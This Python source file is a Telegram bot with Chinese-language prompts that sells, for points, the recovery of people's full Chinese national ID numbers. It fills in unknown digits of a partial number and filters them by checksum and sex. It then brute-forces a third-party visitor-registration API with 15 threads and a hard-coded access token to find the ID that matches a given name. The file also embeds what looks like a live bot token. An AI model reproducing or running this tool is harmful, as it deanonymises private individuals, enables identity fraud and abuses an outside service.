import telebot
import requests
import time
import re
import threading
import json
import os
import itertools
from telebot import types
from concurrent.futures import ThreadPoolExecutor

# ================= 配置区 =================
API_TOKEN = '8417331227:AAESrsOPgEDMeu7NHgLMgoZrynkxoafBLBY'
ADMIN_ID = 6649617045 
ADMIN_USERNAME = "@aaSm68" # 管理员用户名
POINTS_FILE = 'points.json'
TOKEN_FILE = 'token.txt'

# 默认 Token
DEFAULT_TOKEN = "eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9..." 

bot = telebot.TeleBot(API_TOKEN)
user_states = {}
generated_cache = {} 

# --- 数据持久化 ---
def load_data():
    pts = {}
    if os.path.exists(POINTS_FILE):
        try:
            with open(POINTS_FILE, 'r') as f:
                data = json.load(f)
                pts = {int(k): v for k, v in data.items()}
        except: pass
    tk = DEFAULT_TOKEN
    if os.path.exists(TOKEN_FILE):
        try:
            with open(TOKEN_FILE, 'r') as f: tk = f.read().strip()
        except: pass
    return pts, tk

user_points, CURRENT_X_TOKEN = load_data()

def save_points():
    with open(POINTS_FILE, 'w') as f: json.dump(user_points, f)

def save_token(new_tk):
    with open(TOKEN_FILE, 'w') as f: f.write(new_tk)

def is_valid_id(n):
    if len(n) != 18: return False
    try:
        n = n.upper()
        var = [7, 9, 10, 5, 8, 4, 2, 1, 6, 3, 7, 9, 10, 5, 8, 4, 2]
        var_id = ['1', '0', 'X', '9', '8', '7', '6', '5', '4', '3', '2']
        checksum = sum(int(n[i]) * var[i] for i in range(17)) % 11
        return var_id[checksum] == n[17]
    except: return False

# --- 核心核验任务 (命中即停) ---
def run_batch_task(chat_id, msg_id, name, id_list, uid):
    global CURRENT_X_TOKEN
    headers = {"X-Token": CURRENT_X_TOKEN, "content-type": "application/json", "User-Agent": "Mozilla/5.0"}
    
    total = len(id_list)
    done = 0
    success_match = None
    is_running = True
    stop_signal = False

    def progress_monitor():
        nonlocal done, is_running, stop_signal
        last_text = ""
        while is_running and not stop_signal:
            if total > 0:
                percent = int(done / total * 100)
                filled = int(15 * done // total) 
                bar = "█" * filled + "▒" * (15 - filled)
                current_text = f"⌛ **核验中...**\n`[{bar}] {done}/{total} {percent}%`"
                if current_text != last_text:
                    try:
                        bot.edit_message_text(chat_id=chat_id, message_id=msg_id, text=current_text, parse_mode='Markdown')
                        last_text = current_text
                    except: pass
            time.sleep(2)

    threading.Thread(target=progress_monitor, daemon=True).start()

    def verify(id_no):
        nonlocal done, is_running, stop_signal, success_match
        if stop_signal or not is_running: return
            
        try:
            payload = {"id_type": "id_card", "mobile": "15555555555", "id_no": id_no, "name": name}
            r = requests.post("https://wxxcx.cdcypw.cn/wechat/visitor/create", json=payload, headers=headers, timeout=8)
            res = r.json()
            
            if res.get("code") == 401:
                is_running = False
                stop_signal = True
                bot.send_message(chat_id, f"🚨 Token 失效，请联系 {ADMIN_USERNAME} 更新。")
                return
                
            if res.get("code") == 0:
                success_match = f"✨ **发现成功匹配：**\n{name} `{id_no}` 二要素验证成功 ✅\n💰 积分扣除: 100\n当前余额: `{user_points[uid]}`"
                stop_signal = True 
                is_running = False
        except: pass
        finally: done += 1

    with ThreadPoolExecutor(max_workers=15) as executor:
        executor.map(verify, id_list)

    is_running = False 
    time.sleep(0.5)
    
    if success_match:
        bot.edit_message_text(chat_id=chat_id, message_id=msg_id, text=success_match, parse_mode='Markdown')
    else:
        bot.edit_message_text(chat_id=chat_id, message_id=msg_id, text=f"❌ 核验完成，未发现匹配结果。\n💰 积分已扣除。")

# --- 指令处理 ---
@bot.message_handler(commands=['start'])
def start_cmd(message):
    uid = message.from_user.id
    pts = user_points.get(uid, 0)
    bot.send_message(message.chat.id, f"👋 **核验模式**\n💰 积分: `{pts}`\n💸 费用: 100/次\n👤 管理员: {ADMIN_USERNAME}\n\n请输入姓名:", parse_mode='Markdown')
    user_states[message.chat.id] = {'step': 'v_name'}

@bot.message_handler(commands=['gen'])
def gen_cmd(message):
    uid = message.from_user.id
    pts = user_points.get(uid, 0)
    bot.send_message(message.chat.id, f"🛠 **生成模式**\n💰 积分: `{pts}`\n💸 费用: 50/次\n👤 管理员: {ADMIN_USERNAME}\n\n请输入补全号(x表示未知):", parse_mode='Markdown')
    user_states[message.chat.id] = {'step': 'g_card'}

@bot.message_handler(commands=['add'])
def add_points(message):
    if message.from_user.id != ADMIN_ID: return
    try:
        _, tid, amt = message.text.split()
        user_points[int(tid)] = user_points.get(int(tid), 0) + int(amt)
        save_points()
        bot.reply_to(message, f"✅ 积分充值成功！当前余额: `{user_points[int(tid)]}`")
    except: bot.reply_to(message, "格式: `/add ID 分数`")

@bot.callback_query_handler(func=lambda call: call.data == "start_verify_flow")
def callback_start_verify(call):
    uid = call.from_user.id
    if user_points.get(uid, 0) < 100:
        bot.answer_callback_query(call.id, f"❌ 积分不足(需100)，请联系 {ADMIN_USERNAME} 充值", show_alert=True)
        return
    if uid not in generated_cache:
        bot.answer_callback_query(call.id, "❌ 缓存已过期。")
        return
    bot.send_message(call.message.chat.id, "👤 请输入要核验的姓名:")
    user_states[call.message.chat.id] = {'step': 'v_name_after_gen'}
    bot.answer_callback_query(call.id)

# --- 状态机逻辑 ---
@bot.message_handler(func=lambda m: m.chat.id in user_states)
def handle_steps(message):
    state = user_states[message.chat.id]
    uid = message.from_user.id
    text = message.text.strip()

    # 1. 生成模式逻辑
    if state['step'] == 'g_card':
        if len(text) != 18: return
        user_states[message.chat.id].update({'step': 'g_sex', 'card': text.lower()})
        bot.send_message(message.chat.id, "请输入性别(男/女/未知):")

    elif state['step'] == 'g_sex':
        if user_points.get(uid, 0) < 50:
            bot.reply_to(message, f"❌ 余额不足！请联系 {ADMIN_USERNAME} 充值。")
            del user_states[message.chat.id]
            return
            
        card = state['card']
        char_sets = [list(ch) if ch != 'x' else list("0123456789") for ch in card]
        if text == "男": char_sets[16] = ["1", "3", "5", "7", "9"]
        elif text == "女": char_sets[16] = ["0", "2", "4", "6", "8"]

        bot.send_message(message.chat.id, "⏳ 正在计算补全...")
        ids = []
        for res in itertools.product(*char_sets):
            num = "".join(res)
            if is_valid_id(num): ids.append(num)
            if len(ids) >= 5000: break
        
        if ids:
            user_points[uid] -= 50
            save_points()
            generated_cache[uid] = {'ids': ids}
            markup = types.InlineKeyboardMarkup()
            markup.add(types.InlineKeyboardButton("🚀 立即核验这些号码 (100积分)", callback_data="start_verify_flow"))
            bot.send_message(message.chat.id, f"✅ 生成成功！共 `{len(ids)}` 个\n💰 扣除 50 积分\n当前余额: `{user_points[uid]}`", reply_markup=markup)
        else: bot.send_message(message.chat.id, "❌ 未发现合法组合。")
        del user_states[message.chat.id]

    # 2. 核验模式逻辑 (生成后的核验)
    elif state['step'] == 'v_name_after_gen':
        if user_points.get(uid, 0) < 100:
            bot.reply_to(message, "❌ 积分不足！")
            del user_states[message.chat.id]
            return
            
        user_points[uid] -= 100
        save_points()
        ids = generated_cache[uid]['ids']
        msg = bot.send_message(message.chat.id, "⚙️ 启动核验任务...")
        threading.Thread(target=run_batch_task, args=(message.chat.id, msg.message_id, text, ids, uid)).start()
        del user_states[message.chat.id]

    # 3. 普通核验模式逻辑
    elif state['step'] == 'v_name':
        user_states[message.chat.id].update({'step': 'v_ids', 'name': text})
        bot.send_message(message.chat.id, "请发送身份证号列表:")

    elif state['step'] == 'v_ids':
        if user_points.get(uid, 0) < 100:
            bot.reply_to(message, "❌ 积分不足！")
            del user_states[message.chat.id]
            return
            
        raw = re.findall(r'\d{17}[\dXx]', text)
        v_ids = [i for i in raw if is_valid_id(i)]
        if not v_ids: 
            bot.reply_to(message, "❌ 未识别到有效证件号。")
            return
            
        user_points[uid] -= 100
        save_points()
        msg = bot.send_message(message.chat.id, "⚙️ 启动核验任务...")
        threading.Thread(target=run_batch_task, args=(message.chat.id, msg.message_id, state['name'], v_ids, uid)).start()
        del user_states[message.chat.id]

if __name__ == '__main__':
    print("🤖 机器人运行中...")
    bot.infinity_polling()
